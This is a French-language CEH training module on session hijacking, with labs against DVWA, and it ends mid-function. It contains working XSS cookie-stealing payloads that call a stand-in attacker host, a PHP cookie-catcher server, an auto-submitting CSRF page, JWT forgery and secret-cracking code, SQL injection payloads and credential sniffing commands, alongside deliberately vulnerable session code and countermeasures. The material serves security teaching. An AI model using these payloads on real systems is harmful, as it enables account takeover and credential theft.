# 🛡️ CEH v12 — MODULE 11 : VOL DE SESSION
### Guide pédagogique avancé — Pratique complète | ML | exploit4040

---

## 📌 INTRODUCTION — COMPRENDRE LE VOL DE SESSION

Une fois qu'un utilisateur s'authentifie sur une application web, le serveur lui attribue une **session** pour éviter de retaper ses credentials à chaque requête. Cette session est précieuse — elle représente l'identité de l'utilisateur pendant toute la durée de sa connexion.

```
CONCEPT FONDAMENTAL :

SANS SESSION (impossible en pratique) :
Chaque requête → Authentification → Réponse
→ Mot de passe transmis à chaque clic !

AVEC SESSION (standard actuel) :
Requête 1 : Login + Password → Serveur crée SESSION_ID
Requête 2 : SESSION_ID uniquement → Serveur reconnaît
Requête 3 : SESSION_ID uniquement → Serveur reconnaît
[...]

SESSION_ID = Clé temporaire d'identité
→ Voler le SESSION_ID = Voler l'identité !
```

```
IMPACT RÉEL DU SESSION HIJACKING :

POUR L'ATTAQUANT :
├── Accès complet au compte de la victime
├── Sans connaître le mot de passe
├── Sans déclencher les alertes de connexion
├── Même si MFA est activé (session déjà authentifiée)
└── Durée = durée de vie de la session

EXEMPLES HISTORIQUES :
├── Firesheep (2010) : Vol de sessions Facebook/Twitter
│   sur WiFi public → 24h après publication,
│   millions de comptes compromissibles
├── GitHub (2012) : Mass assignment + session fixation
└── Slack (2015) : XSS → vol de tokens de session
```

---

## 📌 PARTIE 1 : ARCHITECTURE DES SESSIONS WEB

### 🔵 Comment une session fonctionne techniquement

```
FLUX COMPLET D'UNE SESSION :
══════════════════════════════════════════════════════════════

ÉTAPE 1 : AUTHENTIFICATION
Client                          Serveur
  │                                │
  │── POST /login ─────────────────>│
  │   username=jean&password=xxx   │
  │                                │
  │   Serveur vérifie credentials  │
  │   Génère SESSION_ID unique     │
  │   Stocke en base : {           │
  │     session_id: "abc123",      │
  │     user_id: 42,               │
  │     created: now(),            │
  │     expires: now()+3600        │
  │   }                            │
  │                                │
  │<── HTTP 200 ────────────────────│
  │    Set-Cookie: PHPSESSID=abc123│
  │    ; HttpOnly; Secure          │

ÉTAPE 2 : REQUÊTES SUIVANTES
  │── GET /dashboard ──────────────>│
  │   Cookie: PHPSESSID=abc123     │
  │                                │
  │   Serveur vérifie session      │
  │   Trouve user_id=42 → Autorisé │
  │                                │
  │<── HTTP 200 (Dashboard) ────────│

ÉTAPE 3 : DÉCONNEXION
  │── POST /logout ─────────────────>│
  │   Cookie: PHPSESSID=abc123      │
  │                                 │
  │   Serveur supprime la session   │
  │   de la base de données         │
  │                                 │
  │<── HTTP 200 + Set-Cookie: ───────│
  │    PHPSESSID=; expires=past     │
```

---

### 🔵 Les mécanismes de gestion de session

#### Cookies HTTP

```
ANATOMIE D'UN COOKIE DE SESSION :
══════════════════════════════════════════════════════════════

Set-Cookie: PHPSESSID=a1b2c3d4e5f6789012345678901234ab;
            Path=/;
            Domain=corp.com;
            Expires=Fri, 15 Nov 2024 22:00:00 GMT;
            HttpOnly;
            Secure;
            SameSite=Strict

ATTRIBUTS DÉTAILLÉS :

┌─────────────────────────────────────────────────────────────┐
│  ATTRIBUT     │  VALEUR      │  RÔLE SÉCURITÉ               │
├─────────────────────────────────────────────────────────────┤
│  HttpOnly     │  Flag seul   │  Inaccessible au JavaScript  │
│               │              │  → Protège contre XSS        │
│  Secure       │  Flag seul   │  HTTPS uniquement            │
│               │              │  → Protège contre sniffing   │
│  SameSite     │  Strict      │  Même site uniquement        │
│               │  Lax         │  → Protège contre CSRF       │
│               │  None        │                              │
│  Domain       │  corp.com    │  Portée du cookie            │
│  Path         │  /           │  Chemin URL concerné         │
│  Expires      │  Date        │  Durée de vie                │
└─────────────────────────────────────────────────────────────┘

FAIBLESSES SI MAL CONFIGURÉ :
├── Pas HttpOnly → JavaScript peut lire le cookie → XSS fatal
├── Pas Secure   → Cookie transmis en HTTP → Sniffing
├── SameSite=None → CSRF possible
└── Pas d'expiration → Session éternelle
```

---

#### JWT — JSON Web Tokens

```
STRUCTURE D'UN JWT :
══════════════════════════════════════════════════════════════

Un JWT = 3 parties séparées par des points :
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJ1c2VySWQiOjQyLCJ1c2VybmFtZSI6ImplYW4ubXVhbWJhIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDA0NzIwMDAsImV4cCI6MTcwMDQ3NTYwMH0
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

PARTIE 1 : HEADER (Base64 décodé)
{
  "alg": "HS256",    ← Algorithme de signature
  "typ": "JWT"
}

PARTIE 2 : PAYLOAD (Base64 décodé)
{
  "userId": 42,
  "username": "jean.muamba",
  "role": "user",
  "iat": 1700472000,   ← Issued At (timestamp)
  "exp": 1700475600    ← Expiration (timestamp)
}

PARTIE 3 : SIGNATURE
HMAC-SHA256(
  base64(header) + "." + base64(payload),
  SECRET_KEY
)

FONCTIONNEMENT :
→ Serveur signe le JWT avec une clé secrète
→ Client stocke le JWT (localStorage ou cookie)
→ Client envoie JWT dans chaque requête :
  Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
→ Serveur vérifie la signature → autorise ou refuse
```

---

## 📌 PARTIE 2 : TECHNIQUES DE VOL DE SESSION

### 🔴 TECHNIQUE 1 : XSS + Vol de Cookie

C'est la technique la plus courante. On combine une vulnérabilité XSS avec le vol du cookie de session.

```
PRÉREQUIS : Cookie sans flag HttpOnly

PAYLOAD XSS BASIQUE (vol de cookie) :
<script>
document.location='http://attaquant.com/steal?c='+document.cookie;
</script>

PAYLOAD XSS AVANCÉ (invisible) :
<script>
var img = new Image();
img.src = 'http://attaquant.com/steal?c=' +
           encodeURIComponent(document.cookie);
</script>

PAYLOAD XSS VIA IMAGE (discret) :
<img src=x onerror="this.src='http://attaquant.com/c?'
+document.cookie">

PAYLOAD XSS VIA SVG :
<svg onload="fetch('http://attaquant.com/steal?c='
+document.cookie)">
```

---

**Démonstration complète avec DVWA :**

```
SCÉNARIO :
Application web DVWA (Damn Vulnerable Web Application)
→ Champ de commentaire vulnérable au Stored XSS
→ Cookie de session sans HttpOnly
→ Victime : Admin qui modère les commentaires

ÉTAPE 1 : Vérifier l'absence de HttpOnly
```

```bash
# Analyser les headers de l'application
curl -I http://192.168.1.10/dvwa/login.php
```

**Sortie :**
```
HTTP/1.1 200 OK
Server: Apache/2.2.8
Set-Cookie: PHPSESSID=abc123def456; path=/
                                          ↑
                             Pas de HttpOnly → VULNÉRABLE !
Set-Cookie: security=low; path=/
Content-Type: text/html
```

```
ÉTAPE 2 : Préparer le serveur d'écoute (attaquant)
```

```bash
# Terminal 1 : Serveur web simple pour capturer les cookies
mkdir /tmp/cookie_catcher
cat > /tmp/cookie_catcher/index.php << 'EOF'
<?php
$cookie = $_GET['c'];
$ip     = $_SERVER['REMOTE_ADDR'];
$date   = date('Y-m-d H:i:s');

$log = "[$date] IP: $ip | Cookie: $cookie\n";
file_put_contents('/tmp/cookie_catcher/stolen_cookies.txt',
                  $log, FILE_APPEND);

echo "404 Not Found";
?>
EOF

cd /tmp/cookie_catcher
php -S 0.0.0.0:8888
```

**Sortie serveur :**
```
PHP 8.1.0 Development Server started at 2024-11-15 19:00:00
Listening on http://0.0.0.0:8888
Document root is /tmp/cookie_catcher
Press Ctrl-C to quit.
```

```
ÉTAPE 3 : Injecter le payload XSS dans DVWA
(section Stored XSS)
```

```html
<!-- Payload injecté dans le champ "Message" de DVWA -->
<script>
var cookie = document.cookie;
var img = new Image();
img.src = 'http://192.168.1.5:8888/?c=' +
           encodeURIComponent(cookie);
</script>
```

```
ÉTAPE 4 : Attendre que l'admin visite la page
```

**Sortie du serveur d'écoute quand l'admin visite :**
```
PHP 8.1.0 Development Server started
[2024-11-15 19:05:23] 192.168.1.20:52341 [200]:
/?c=PHPSESSID%3Dabc123def456admin%3B+security%3Dlow

[2024-11-15 19:05:23] Request : GET /?c=PHPSESSID=abc123def456admin;security=low
```

```bash
# Voir les cookies volés
cat /tmp/cookie_catcher/stolen_cookies.txt
```

**Sortie :**
```
[2024-11-15 19:05:23] IP: 192.168.1.20 |
Cookie: PHPSESSID=abc123def456admin; security=low

→ Cookie de session admin capturé !
→ PHPSESSID = abc123def456admin
```

```
ÉTAPE 5 : Utiliser le cookie volé avec Burp Suite
```

```
Dans Burp Suite :
1. Ouvrir le navigateur intégré
2. Naviguer vers http://192.168.1.10/dvwa/
3. Ouvrir DevTools → Application → Cookies
4. Modifier PHPSESSID = abc123def456admin
5. Recharger la page

→ On est maintenant connecté en tant qu'admin !
→ Sans connaître le mot de passe !
```

---

### 🔴 TECHNIQUE 2 : Session Sniffing

```
PRÉREQUIS : Application HTTP (non HTTPS) + Position MITM

SCÉNARIO :
→ ARP Spoofing en place (voir Module 8)
→ Application corporate tourne en HTTP
→ Capture du trafic avec Wireshark/tcpdump
```

```bash
# Après ARP Spoofing actif
sudo tcpdump -i eth0 -A 'tcp port 80 and host 192.168.1.20' \
             -w http_session.pcap
```

```bash
# Extraire les cookies du trafic capturé
tshark -r http_session.pcap \
       -Y "http.cookie" \
       -T fields -e http.cookie
```

**Sortie :**
```
PHPSESSID=xyz789admin456; csrftoken=abc123
PHPSESSID=xyz789admin456; csrftoken=abc123
PHPSESSID=xyz789admin456; csrftoken=abc123

→ Cookie de session capturé dans le trafic HTTP en clair !
```

```bash
# Extraire tous les credentials HTTP POST
tshark -r http_session.pcap \
       -Y "http.request.method == POST" \
       -T fields \
       -e ip.src \
       -e http.request.uri \
       -e http.file_data
```

**Sortie :**
```
192.168.1.20  /corp/login.php  username=jean.muamba&password=Kinshasa2024&submit=Login

→ Credentials en clair capturés !
```

---

### 🔴 TECHNIQUE 3 : Session Fixation

```
PRINCIPE :
L'attaquant IMPOSE un SESSION_ID connu à la victime
AVANT qu'elle s'authentifie.

MÉCANISME DÉTAILLÉ :
══════════════════════════════════════════════════════════════

ÉTAPE 1 : L'attaquant obtient un SESSION_ID valide
  → Il visite le site en tant qu'anonyme
  → Obtient : PHPSESSID=ATTACKER_KNOWN_ID

ÉTAPE 2 : L'attaquant force ce SESSION_ID à la victime
  → Via un lien malveillant :
  http://corp.com/login.php?PHPSESSID=ATTACKER_KNOWN_ID

  → Via header injection
  → Via XSS (document.cookie = "PHPSESSID=ATTACKER_KNOWN_ID")

ÉTAPE 3 : La victime clique sur le lien et se connecte
  → Elle s'authentifie avec PHPSESSID=ATTACKER_KNOWN_ID
  → Si le serveur ne régénère PAS le SESSION_ID après login...
  → La session ATTACKER_KNOWN_ID est maintenant AUTHENTIFIÉE !

ÉTAPE 4 : L'attaquant utilise le SESSION_ID connu
  → Il navigue avec PHPSESSID=ATTACKER_KNOWN_ID
  → Il est maintenant connecté en tant que la victime !

VISUALISATION :

Attaquant              Serveur              Victime
    │                     │                    │
    │── GET /login ───────>│                   │
    │<── SESSID=KNOWN_ID ──│                   │
    │                     │                    │
    │                     │ Envoie lien à la  │
    │                     │ victime avec      │
    │                     │ SESSID=KNOWN_ID   │
    │                     │──────────────────>│
    │                     │                    │
    │                     │<── login (KNOWN_ID)│
    │                     │  Session KNOWN_ID  │
    │                     │  = Authentifiée !  │
    │                     │                    │
    │── GET avec KNOWN_ID─>│                   │
    │<── Dashboard Victime ─│                  │
    │                     │                    │
    └── Attaquant dans     │                    │
        le compte victime !│                    │
```

**Code PHP VULNÉRABLE à la Session Fixation :**

```php
<?php
// CODE VULNÉRABLE - Ne pas utiliser en production !
session_start();   // Accepte le SESSION_ID de l'URL !
                   // Ex: ?PHPSESSID=ATTACKER_ID

if ($_POST['username'] === 'admin' &&
    $_POST['password'] === 'correct_password') {
    
    $_SESSION['authenticated'] = true;
    $_SESSION['user'] = 'admin';
    // ⚠️ PAS de session_regenerate_id() ici !
    // → La session ATTACKER_ID devient maintenant admin !
    
    header('Location: /dashboard.php');
}
?>
```

**Code PHP SÉCURISÉ :**

```php
<?php
// CODE SÉCURISÉ
session_start();

if ($_POST['username'] === 'admin' &&
    $_POST['password'] === 'correct_password') {
    
    // ✅ Régénérer le SESSION_ID APRÈS authentification
    session_regenerate_id(true);  // true = supprime l'ancienne
    
    $_SESSION['authenticated'] = true;
    $_SESSION['user'] = 'admin';
    
    header('Location: /dashboard.php');
}
?>
```

---

## 📌 PARTIE 3 : BURP SUITE — MAÎTRISE COMPLÈTE

**Burp Suite** est l'outil de test de sécurité web le plus utilisé au monde. Il sera ton outil principal pour tout ce module.

---

### 🛠️ Architecture Burp Suite

```
MODULES BURP SUITE COMMUNITY EDITION :
══════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────┐
│  MODULE        │  RÔLE                                       │
├─────────────────────────────────────────────────────────────┤
│  Proxy         │  Intercepter/modifier les requêtes HTTP     │
│  Repeater      │  Rejouer des requêtes modifiées             │
│  Intruder      │  Attaques automatisées (bruteforce, fuzzing)│
│  Sequencer     │  Analyser l'aléatoire des tokens           │
│  Decoder       │  Encoder/décoder (Base64, URL, HTML...)     │
│  Comparer      │  Comparer deux réponses                     │
│  Target        │  Cartographie de l'application              │
│  Logger        │  Historique de tout le trafic               │
└─────────────────────────────────────────────────────────────┘
```

---

### 🛠️ Configuration du Proxy Burp

```
CONFIGURATION :
══════════════════════════════════════════════════════════════

1. BURP SUITE :
   Proxy → Options → Proxy Listeners
   → Add : 127.0.0.1:8080

2. NAVIGATEUR (Firefox) :
   Settings → Network → Manual Proxy
   HTTP Proxy: 127.0.0.1  Port: 8080

3. CERTIFICAT BURP (pour HTTPS) :
   Navigateur → http://burpsuite
   → Download CA Certificate
   → Importer dans Firefox :
     Settings → Privacy → Certificates →
     Import → Cocher "Trust for websites"

4. INTERCEPTER UNE REQUÊTE :
   Proxy → Intercept → "Intercept is ON"
   → Naviguer sur le site cible
   → La requête est stoppée dans Burp !
```

---

### 🛠️ Burp Proxy — Intercepter et modifier des requêtes

```
SCÉNARIO PRATIQUE : Modifier un paramètre de session
```

**Requête interceptée par Burp :**
```
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 192.168.1.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Firefox/95.0
Accept: text/html,application/xhtml+xml
Accept-Language: fr,fr-FR;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=abc123def456; security=low
Referer: http://192.168.1.10/dvwa/vulnerabilities/sqli/
```

```
MODIFICATION DANS BURP :
→ Changer "security=low" en "security=impossible"
→ Observer si l'application accepte la modification
→ Tester des injections dans le paramètre "id"
→ Modifier le Cookie PHPSESSID avec un cookie volé

→ Forward : envoyer la requête modifiée
→ Drop    : abandonner la requête
```

---

### 🛠️ Burp Repeater — Rejouer des requêtes

Le **Repeater** permet de rejouer une requête autant de fois que nécessaire avec des modifications.

```
UTILISATION PRATIQUE :

1. Dans Proxy → Click droit → "Send to Repeater"

2. Dans Repeater :
   → Modifier la requête
   → Cliquer "Send"
   → Observer la réponse
   → Modifier à nouveau
   → Répéter jusqu'à trouver la vulnérabilité
```

**Exemple — Test d'injection SQL avec Repeater :**

**Requête originale :**
```
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 192.168.1.10
Cookie: PHPSESSID=abc123; security=low
```

**Réponse normale :**
```
HTTP/1.1 200 OK

ID: 1
First name: admin
Surname: admin
```

**Requête modifiée (test SQLi) :**
```
GET /dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit HTTP/1.1
Host: 192.168.1.10
Cookie: PHPSESSID=abc123; security=low
```

**Réponse avec SQLi :**
```
HTTP/1.1 200 OK

You have an error in your SQL syntax;
check the manual that corresponds to
your MySQL server version for the right
syntax to use near ''1'' LIMIT 1' at line 1

→ INJECTION SQL CONFIRMÉE !
```

**Requête avec UNION pour extraire les données :**
```
GET /dvwa/vulnerabilities/sqli/?id=1'
  UNION SELECT user(),database()--+
  &Submit=Submit HTTP/1.1
```

**Réponse :**
```
HTTP/1.1 200 OK

ID: 1' UNION SELECT user(),database()--+
First name: root@localhost
Surname: dvwa

→ root@localhost = utilisateur MySQL
→ dvwa = base de données courante
```

---

### 🛠️ Burp Intruder — Attaques automatisées

```
TYPES D'ATTAQUES INTRUDER :

SNIPER :
→ Un seul point d'injection
→ Une wordlist
→ Chaque valeur testée une par une
→ Usage : bruteforce d'un champ unique

BATTERING RAM :
→ Plusieurs points d'injection
→ Même valeur dans TOUS les points simultanément
→ Usage : même credential dans username ET password

PITCHFORK :
→ Plusieurs points d'injection
→ Plusieurs wordlists synchronisées ligne par ligne
→ Usage : tester des paires username/password connues

CLUSTER BOMB :
→ Plusieurs points d'injection
→ Toutes les combinaisons de plusieurs wordlists
→ Usage : bruteforce complet username + password
```

**Démonstration — Bruteforce login DVWA avec Intruder :**

```
ÉTAPE 1 : Intercepter la requête de login
```

```
POST /dvwa/login.php HTTP/1.1
Host: 192.168.1.10
Cookie: PHPSESSID=new_session; security=low
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&Login=Login
```

```
ÉTAPE 2 : Send to Intruder
→ Sélectionner "password=§test§"
→ § marquent les points d'injection

ÉTAPE 3 : Payloads
→ Payload type: Simple list
→ Ajouter : password, admin, 123456, test, letmein,
            dragon, master, welcome, login, passw0rd
            
ÉTAPE 4 : Options
→ Grep Match : "Login failed" (pour détecter échec)
→ Grep Match : "Welcome" (pour détecter succès)

ÉTAPE 5 : Start Attack
```

**Résultats Intruder :**
```
┌────────────────────────────────────────────────────────────┐
│  #   │  Payload    │  Status │  Length │  Login failed     │
├────────────────────────────────────────────────────────────┤
│  1   │  password   │  200    │  4521   │  ✓                │
│  2   │  admin      │  200    │  4521   │  ✓                │
│  3   │  123456     │  200    │  4521   │  ✓                │
│  4   │  test       │  200    │  4521   │  ✓                │
│  5   │  password   │  302    │  342    │  ✗  ← SUCCÈS !   │
└────────────────────────────────────────────────────────────┘

→ Réponse 302 (redirect) = login réussi
→ Longueur différente = contenu différent
→ Mot de passe trouvé : "password"
```

---

### 🛠️ Burp Sequencer — Analyser la prédictibilité des tokens

```
OBJECTIF :
Tester si les SESSION_ID sont vraiment aléatoires.
Un SESSION_ID prévisible = attaque de Session Prediction.

UTILISATION :
1. Intercepter une réponse Set-Cookie
2. Click droit → "Send to Sequencer"
3. Sequencer → Token Location : Cookie PHPSESSID
4. "Start live capture" → capturer 100+ tokens

RÉSULTATS POSSIBLES :

BON TOKEN (aléatoire) :
Effective entropy: 127.4 bits
Overall result: EXCELLENT
→ Impossible à prédire

MAUVAIS TOKEN (prévisible) :
Effective entropy: 12.3 bits
Overall result: POOR
→ Attaque de session prediction possible !
Token pattern détecté :
  Session 1: 000000001
  Session 2: 000000002
  Session 3: 000000003
  → Séquentiel ! L'attaquant peut deviner les sessions !
```

---

## 📌 PARTIE 4 : CSRF — CROSS-SITE REQUEST FORGERY

### 🔵 Comprendre CSRF en profondeur

```
DÉFINITION :
CSRF exploite la confiance qu'un serveur a
envers le navigateur d'un utilisateur authentifié.

PRINCIPE :
→ La victime est connectée sur banque.com (cookie valide)
→ Elle visite un site malveillant
→ Le site malveillant envoie une requête À SON INSU
  vers banque.com
→ Banque.com reçoit la requête avec le vrai cookie
  de la victime → EXÉCUTE L'ACTION !

ANALOGIE :
Un malfaiteur glisse une lettre signée de ta main
(que tu n'as pas écrite) dans ton courrier vers ta banque.
La banque voit ta signature → exécute l'instruction.
```

---

### 🔵 CSRF en pratique — Démonstration complète

**Scénario :** Application de changement de mot de passe vulnérable.

**Page légitime de changement de mot de passe :**
```html
<!-- http://192.168.1.10/dvwa/vulnerabilities/csrf/ -->
<form method="GET" action="/dvwa/vulnerabilities/csrf/">
  <input type="text" name="password_new" 
         placeholder="Nouveau mot de passe">
  <input type="text" name="password_conf"
         placeholder="Confirmer">
  <input type="submit" name="Change" value="Change">
</form>
```

**La requête HTTP générée (légitime) :**
```
GET /dvwa/vulnerabilities/csrf/
    ?password_new=NouveauMdp&password_conf=NouveauMdp&Change=Change
    HTTP/1.1
Host: 192.168.1.10
Cookie: PHPSESSID=abc123admin; security=low
Referer: http://192.168.1.10/dvwa/vulnerabilities/csrf/
```

**Page malveillante créée par l'attaquant :**
```html
<!-- http://site-malveillant.com/cadeau.html -->
<!DOCTYPE html>
<html>
<head><title>Gagnez un iPhone !</title></head>
<body>

<h1>Félicitations ! Vous avez gagné un iPhone 15 Pro !</h1>

<!-- REQUÊTE CSRF INVISIBLE -->
<!-- S'exécute automatiquement quand la page charge -->
<img src="http://192.168.1.10/dvwa/vulnerabilities/csrf/
          ?password_new=hacked&password_conf=hacked&Change=Change"
     width="0" height="0">

<!-- Alternative avec formulaire auto-submit -->
<form id="csrf_form" method="GET"
      action="http://192.168.1.10/dvwa/vulnerabilities/csrf/"
      style="display:none">
  <input name="password_new" value="hacked">
  <input name="password_conf" value="hacked">
  <input name="Change" value="Change">
</form>
<script>
  document.getElementById('csrf_form').submit();
</script>

</body>
</html>
```

**Ce qui se passe :**
```
1. Victime (admin) est connectée sur DVWA (cookie valide)
2. Victime visite site-malveillant.com/cadeau.html
3. Image invisible → navigateur fait GET vers DVWA
   AVEC le cookie admin automatiquement !
4. DVWA reçoit requête authentifiée → Change le mot de passe !
5. Attaquant se connecte avec le nouveau mot de passe "hacked"

→ La victime ne s'aperçoit de rien !
```

**Analyse dans Burp :**
```
Requête CSRF envoyée automatiquement :

GET /dvwa/vulnerabilities/csrf/
    ?password_new=hacked&password_conf=hacked&Change=Change
    HTTP/1.1
Host: 192.168.1.10
Cookie: PHPSESSID=abc123admin; security=low   ← Cookie légitime !
Referer: http://site-malveillant.com/cadeau.html ← Origine suspecte !

Réponse :
HTTP/1.1 200 OK
Password Changed.   ← ATTAQUE RÉUSSIE !
```

---

### 🔵 CSRF Token — La contre-mesure principale

```
PRINCIPE DU CSRF TOKEN :

SANS PROTECTION :
GET /change-password?new=hacked HTTP/1.1
Cookie: session=abc123    ← Envoyé automatiquement

AVEC CSRF TOKEN :
GET /change-password?new=hacked&csrf_token=RANDOM_VALUE
Cookie: session=abc123

→ L'attaquant doit connaître le CSRF Token
→ Il est unique par session ET par formulaire
→ Il est dans le DOM → nécessite Same-Origin Policy
→ Le site malveillant ne peut PAS lire le DOM de DVWA
→ CSRF impossible !
```

**Implémentation correcte d'un CSRF Token :**

```php
<?php
// Génération côté serveur
session_start();

// Générer le token si absent
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Dans le formulaire HTML
echo '<input type="hidden" name="csrf_token"
      value="' . $_SESSION['csrf_token'] . '">';

// Validation à la soumission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf_token'],
                     $_POST['csrf_token'])) {
        die('CSRF Token invalide !');
    }
    // Token valide → traiter le formulaire
    
    // Régénérer le token après utilisation
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
```

---

## 📌 PARTIE 5 : ATTAQUES JWT

### 🔵 Attaque 1 : Algorithme "none"

```
VULNÉRABILITÉ :
Certaines implémentations JWT acceptent
l'algorithme "none" = pas de signature !
→ N'importe qui peut forger un JWT valide !

JWT LÉGITIME :
Header : {"alg":"HS256","typ":"JWT"}
Payload: {"userId":42,"role":"user"}
Signature: [valide]

JWT FORGÉ (algorithme none) :
Header : {"alg":"none","typ":"JWT"}
Payload: {"userId":42,"role":"admin"}  ← Escalade de privilèges !
Signature: [vide]

CONSTRUCTION :
```

```python
import base64
import json

# Header avec alg=none
header = {"alg": "none", "typ": "JWT"}
header_encoded = base64.urlsafe_b64encode(
    json.dumps(header, separators=(',',':')).encode()
).rstrip(b'=').decode()

# Payload modifié (role=admin)
payload = {
    "userId": 42,
    "username": "jean.muamba",
    "role": "admin",   # ← Escalade de privilèges !
    "iat": 1700472000,
    "exp": 9999999999
}
payload_encoded = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(',',':')).encode()
).rstrip(b'=').decode()

# JWT sans signature
forged_jwt = f"{header_encoded}.{payload_encoded}."

print(f"JWT forgé : {forged_jwt}")
```

**Sortie :**
```
JWT forgé :
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
.eyJ1c2VySWQiOjQyLCJ1c2VybmFtZSI6ImplYW4ubXVhbWJhIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwNDcyMDAwLCJleHAiOjk5OTk5OTk5OTl9
.

Test avec curl :
curl -H "Authorization: Bearer eyJhbGciOiJub25lIi..." \
     http://api.corp.com/admin/users
```

---

### 🔵 Attaque 2 : Brute Force du Secret JWT

```
PRINCIPE :
Si la clé secrète HMAC est faible,
on peut la retrouver par bruteforce.
Avec la clé, on peut forger n'importe quel JWT.
```

```bash
# hashcat pour cracker le secret JWT
# Mode 16500 = JWT (JSON Web Token)
hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt
```

**Format du fichier jwt_token.txt :**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Sortie hashcat :**
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT - JSON Web Token)
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vy...

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c:secret

→ Clé secrète trouvée : "secret" (trop faible !)
```

```python
# Forger un nouveau JWT avec la clé trouvée
import jwt

secret_key = "secret"
payload = {
    "userId": 1,
    "role": "admin",    # Escalade !
    "exp": 9999999999
}

forged_token = jwt.encode(payload, secret_key, algorithm="HS256")
print(f"Token forgé avec droits admin : {forged_token}")
```

---

### 🔵 Attaque 3 : RS256 → HS256 Confusion

```
VULNÉRABILITÉ AVANCÉE :
Application utilise RS256 (asymétrique) :
→ Clé PRIVÉE pour signer
→ Clé PUBLIQUE pour vérifier

Si le serveur accepte aussi HS256 :
→ Attaquant signe avec la CLÉ PUBLIQUE (connue!)
  en utilisant HS256 au lieu de RS256
→ Le serveur vérifie avec la clé publique
  (qu'il utilise normalement pour RS256)
→ Signature valide → Token forgé accepté !

PRÉCONDITIONS :
1. Connaître la clé publique RS256 (souvent publique!)
2. Serveur accepte les deux algorithmes

RÉSULTAT :
→ Forger n'importe quel JWT valide
→ Escalade de privilèges totale
```

---

## 📌 PARTIE 6 : MAN-IN-THE-BROWSER (MITB)

```
MITB vs MITM :
══════════════════════════════════════════════════════════════

MITM (Man-in-the-Middle) :
→ Attaquant entre deux machines sur le réseau
→ Nécessite position réseau privilégiée
→ Détectable par monitoring réseau

MITB (Man-in-the-Browser) :
→ Trojan injecté dans le navigateur de la victime
→ Intercepte les données DANS le navigateur
→ AVANT le chiffrement TLS !
→ Indétectable par monitoring réseau
→ Contourne HTTPS complètement !

MÉCANISME :
Trojan bancaire infecte le PC
→ S'injecte dans le processus navigateur
→ Hook les fonctions de requête HTTP
→ Intercepte/modifie les données avant envoi
→ Vire $10 000 sur compte attaquant
→ Modifie l'affichage pour cacher la transaction
→ La victime voit son solde normal !

EXEMPLES :
├── Zeus → MITB + Form grabbing
├── SpyEye → MITB + Webinjects
├── Carbanak → Fraude bancaire massive
└── Gootkit → MITB moderne
```

---

## 📌 PARTIE 7 : COOKIE EDITING TOOLS — MANIPULATION PRATIQUE

### 🛠️ EditThisCookie (Extension navigateur)

```
UTILISATION :
1. Installer EditThisCookie dans Chrome/Firefox
2. Naviguer sur un site web
3. Cliquer l'icône EditThisCookie
4. Voir tous les cookies du site courant
5. Modifier les valeurs directement

SCÉNARIO PRATIQUE :
→ Site avec cookie : role=user
→ Modifier en : role=admin
→ Si le serveur fait confiance au cookie côté client
  → Escalade de privilèges !

→ Site avec cookie : userid=42
→ Modifier en : userid=1 (souvent l'admin)
→ Si pas de validation côté serveur
  → Accès au compte admin !
```

---

### 🛠️ Manipulation avec Burp Suite DevTools

```
MANIPULER UN JWT AVEC BURP :

1. Intercepter une requête dans Burp Proxy
2. Trouver le JWT dans le header Authorization
3. Click droit → "Send to Repeater"

4. Dans Repeater, décoder le JWT :
   Decoder tab → Decode as Base64
   (décoder chaque partie séparément)

5. Modifier le payload décodé :
   {"userId":42,"role":"user"}  →  {"userId":1,"role":"admin"}

6. Réencoder en Base64
7. Reconstruire le JWT modifié
8. Renvoyer la requête

OU UTILISER L'EXTENSION "JSON Web Tokens" DE BURP :
→ Affiche le JWT décodé directement
→ Permet modification visuelle
→ Re-signe automatiquement si clé disponible
```

---

## 📌 PARTIE 8 : CONTRE-MESURES COMPLÈTES

### 🔵 Contre-mesures côté développeur

```php
<?php
// CONFIGURATION SÉCURISÉE DES SESSIONS PHP
// ══════════════════════════════════════════════════════════════

// 1. GENERATION ID SÉCURISÉE
ini_set('session.entropy_length', 32);
ini_set('session.hash_function', 'sha256');
ini_set('session.hash_bits_per_character', 6);

// 2. COOKIES SÉCURISÉS
ini_set('session.cookie_httponly', 1);   // Pas de JS
ini_set('session.cookie_secure', 1);     // HTTPS only
ini_set('session.cookie_samesite', 'Strict');  // Anti-CSRF

// 3. TIMEOUT DE SESSION
ini_set('session.gc_maxlifetime', 1800); // 30 minutes

// 4. REGENERER APRES LOGIN
session_start();
if (login_successful()) {
    session_regenerate_id(true); // Anti-fixation
    $_SESSION['user'] = $user_id;
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION['created'] = time();
}

// 5. VALIDATION DE SESSION
function validate_session() {
    // Vérifier IP (attention aux proxies)
